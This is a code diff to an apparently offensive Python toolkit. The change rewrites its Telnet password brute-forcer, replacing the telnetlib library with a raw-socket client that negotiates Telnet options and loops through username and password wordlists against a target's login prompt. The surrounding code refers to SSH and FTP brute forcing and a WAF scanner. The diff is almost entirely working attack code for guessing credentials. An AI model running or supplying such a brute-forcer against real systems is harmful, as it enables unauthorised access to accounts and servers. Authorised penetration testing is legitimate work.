@@ -5,7 +5,6 @@ import time
 import re
 import paramiko
 import ftplib
-import telnetlib
 import requests 
 from urllib.parse import urljoin
 import os
@@ -826,7 +825,7 @@ class BruteForcer:
             pbar.close()
 
     def _validate_service(self, service):
-        valid_services = ['ssh', 'ftp', 'telnet']
+        valid_services = ['ssh', 'ftp', 'telnet'] 
         if service.lower() not in valid_services:
             print(Fore.RED + "[!] Invalid service. Please choose SSH, FTP, or Telnet." + Style.RESET_ALL)
             return False
@@ -974,10 +973,85 @@ class BruteForcer:
             if progress_thread and progress_thread.is_alive():
                 progress_thread.join(timeout=1)
             print("\033[2K\r", end="")
-
+    
     def telnet_bruteforce(self, target, username_or_wordlist, password_wordlist, port=23, timeout=5):
         progress_thread = None
         try:
+            def telnet_login(username, password):
+                try:
+                    
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(timeout)
+                    sock.connect((target, port))
+
+                    
+                    def read_until(prompt):
+                        buffer = b''
+                        while True:
+                            data = sock.recv(1024)
+                            if not data:
+                                break
+                            buffer += data
+                            if prompt in buffer:
+                                break
+                        return buffer
+
+                    
+                    def handle_telnet_options(data):
+                        response = b''
+                        i = 0
+                        while i < len(data):
+                            if data[i] == 0xff:  
+                                if i + 2 <= len(data):
+                                    cmd = data[i+1]
+                                    opt = data[i+2]
+                                    
+                                    if cmd in (251, 252, 253, 254):
+                                        response += bytes([255, 252, opt])
+                                    i += 3
+                                else:
+                                    break
+                            else:
+                                i += 1
+                        return response
+
+                    
+                    initial = sock.recv(1024)
+                    if initial:
+                        sock.send(handle_telnet_options(initial))
+
+                    
+                    login_prompt = read_until(b'login: ')
+                    if b'login:' not in login_prompt:
+                        return False
+
+                    
+                    sock.send(username.encode() + b'\r\n')
+                    sock.send(handle_telnet_options(sock.recv(1024)))
+
+                    
+                    password_prompt = read_until(b'Password: ')
+                    if b'Password:' not in password_prompt:
+                        return False
+
+                    
+                    sock.send(password.encode() + b'\r\n')
+
+                    
+                    response = read_until(b'$ ')  
+                    if b'Login incorrect' not in response and b'Last login' in response:
+                        return True
+                    return False
+
+                except Exception as e:
+                    return False
+                finally:
+                    try:
+                        sock.close()
+                    except:
+                        pass
+
+            
             if os.path.isfile(username_or_wordlist):
                 with open(username_or_wordlist, 'r') as user_file, open(password_wordlist, 'r') as pass_file:
                     usernames = [line.strip() for line in user_file]
@@ -988,23 +1062,12 @@ class BruteForcer:
 
                     for username in usernames:
                         for password in passwords:
-                            try:
-                                tn = telnetlib.Telnet(target, port=port, timeout=timeout)
-                                tn.read_until(b"login: ")
-                                tn.write(username.encode('ascii') + b"\n")
-                                tn.read_until(b"Password: ")
-                                tn.write(password.encode('ascii') + b"\n")
-                                result = tn.expect([b"Login incorrect", b"Last login"], timeout=timeout)
-                                if result[0] == 1:
-                                    tqdm.write(Fore.GREEN + f"\n[!] Telnet Success: {username}:{password}")
-                                    tn.close()
-                                    self.scan_complete = True
-                                    return (username, password)
-                                tn.close()
-                            except:
-                                with self.lock:
-                                    self.progress += 1
-                                continue
+                            if telnet_login(username, password):
+                                tqdm.write(Fore.GREEN + f"\n[!] Telnet Success: {username}:{password}")
+                                self.scan_complete = True
+                                return (username, password)
+                            with self.lock:
+                                self.progress += 1
             else:
                 username = username_or_wordlist
                 with open(password_wordlist, 'r') as f:
@@ -1014,29 +1077,17 @@ class BruteForcer:
                     progress_thread.start()
 
                     for password in passwords:
-                        try:
-                            tn = telnetlib.Telnet(target, port=port, timeout=timeout)
-                            tn.read_until(b"login: ")
-                            tn.write(username.encode('ascii') + b"\n")
-                            tn.read_until(b"Password: ")
-                            tn.write(password.encode('ascii') + b"\n")
-                            result = tn.expect([b"Login incorrect", b"Last login"], timeout=timeout)
-                            if result[0] == 1:
-                                tqdm.write(Fore.GREEN + f"\n[!] Telnet Success: {username}:{password}")
-                                tn.close()
-                                self.scan_complete = True
-                                return (username, password)
-                            tn.close()
-                        except:
-                            with self.lock:
-                                self.progress += 1
-                            continue
+                        if telnet_login(username, password):
+                            tqdm.write(Fore.GREEN + f"\n[!] Telnet Success: {username}:{password}")
+                            self.scan_complete = True
+                            return (username, password)
+                        with self.lock:
+                            self.progress += 1
         finally:
             self.scan_complete = True
             if progress_thread and progress_thread.is_alive():
                 progress_thread.join(timeout=1)
-            print("\033[2K\r", end="")  
-
+            print("\033[2K\r", end="")
 # WAF Scanner 
 class WafScanner:
     def __init__(self):
